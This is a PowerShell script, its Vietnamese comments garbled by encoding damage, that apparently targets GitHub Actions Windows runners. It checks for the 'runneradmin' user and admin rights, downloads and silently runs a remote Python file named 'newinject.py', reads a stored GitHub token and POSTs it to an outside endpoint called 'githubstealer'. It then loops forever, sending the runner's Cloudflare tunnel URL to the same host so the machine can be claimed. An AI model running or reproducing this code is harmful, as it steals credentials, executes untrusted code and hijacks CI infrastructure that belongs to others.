# L·∫•y t√™n user hi·ªán t·∫°i
$currentUser = $env:USERNAME

if ($currentUser -ne "runneradmin") {
    Write-Host "‚ùå Script ch·ªâ ch·∫°y khi user l√† runneradmin (hi·ªán t·∫°i: $currentUser)"
    exit 1
}

Write-Host "‚úÖ User hi·ªán t·∫°i l√† runneradmin."

# Ki·ªÉm tra quy·ªÅn admin
$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-Not $IsAdmin) {
    Write-Host "‚ùå Script c·∫ßn ch·∫°y v·ªõi quy·ªÅn Administrator."
    exit 1
}

Write-Host "‚úÖ Script ƒëang ch·∫°y d∆∞·ªõi quy·ªÅn Administrator."

# ƒê∆∞·ªùng d·∫´n file s·∫Ω t·∫£i
$scriptUrl  = "https://raw.githubusercontent.com/c2loves/infected/refs/heads/main/newinject.py"
$scriptPath = "$env:TEMP\injectnew.py"

# T·∫£i file v·ªÅ
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing
Write-Host "üì• ƒê√£ t·∫£i v·ªÅ: $scriptPath"

# Ki·ªÉm tra Python ƒë√£ c√†i ch∆∞a
if (-Not (Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Host "‚ùå Ch∆∞a c√≥ Python trong PATH."
    exit 1
}

# Ch·∫°y script Python
Write-Host "üöÄ ƒêang ch·∫°y script Python..."
pythonw $scriptPath

$startTime = Get-Date
$maxSeconds = 60   # v√≠ d·ª• ch·∫°y t·ªëi ƒëa 60s

while (((Get-Date) - $startTime).TotalSeconds -lt $maxSeconds) {
    try {
        # ƒê·ªçc token
        $token = Get-Content "D:\a\vpstoken.txt" -Raw

        # Chu·∫©n b·ªã body JSON
        $body = @{
            githubtoken = $token
        } | ConvertTo-Json

        # URL ƒë√≠ch
        $url = "http://simpleappchat.elementfx.com/githubstealer/tokenngonvcl.php"

        # Header
        $headers = @{
            "Content-Type" = "application/json"
        }

        # G·ª≠i POST
        $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body

        Write-Host "‚úÖ Success"
        $response | ConvertTo-Json

        break  # Tho√°t v√≤ng l·∫∑p n·∫øu th√†nh c√¥ng
    } catch {
        Write-Host "‚ö†Ô∏è Error occurred, retrying in 1 second..."
        Start-Sleep -Seconds 1
    }
}



while ($true) {
    $logFile = Get-ChildItem -Path "D:\A" -Recurse -Filter "cloudflared.log" | Select-Object -First 1
    if ($logFile) {
        $content = Get-Content -Path $logFile.FullName -Raw
        if ($content -match "https://[a-zA-Z0-9-]+\.trycloudflare\.com") {
            $url = $matches[0]
            $response = Invoke-WebRequest -Uri "http://simpleappchat.elementfx.com/claimvps.php" -Method POST -Body @{ cloudflaredUrl = $url }
            Write-Output "Sent: $url"
            Write-Output "Reply: $($response.Content)"
        } else {
            Write-Output "No URL found in log."
        }
    } else {
        Write-Output "No cloudflared.log found in D:\A"
    }
    Start-Sleep -Seconds 5
}
